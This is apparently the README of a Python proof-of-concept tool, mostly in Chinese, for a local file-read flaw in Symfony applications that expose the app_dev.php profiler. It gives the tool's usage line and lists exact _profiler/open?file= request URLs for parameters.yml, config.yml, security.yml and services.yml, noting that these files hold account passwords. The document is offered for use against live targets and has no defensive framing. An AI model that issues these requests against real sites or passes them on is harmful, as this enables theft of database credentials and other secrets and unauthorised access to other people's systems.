# InfoLeak-Symfony
InfoLeak-Symfony
usage:
python3 poc.py http://xxxx.xx
这是Symfony框架的一个文件读取
Symfony为web框架，该漏洞为本地文件读取，可读取Symfony框架下的任意文件（非系统文件）。利用该漏洞可读取Symfony配置文件

靶标位置为: https://xxx/app_dev.php/_profiler/open?file=app/config/parameters.yml   #database所在地
该文件为Symfony的配置文件，含有各类的账号密码。
其他配置文件有：
https://xxx/app_dev.php/_profiler/                # 面板
https://xxx/app_dev.php/_profiler/open?file=app/config/config.yml                # 其他配置信息
https://xxx/app_dev.php/_profiler/open?file=app/config/security.yml        # 其他配置信息
https://xxx/app_dev.php/_profiler/open?file=app/config/services.yml        # 其他配置信息
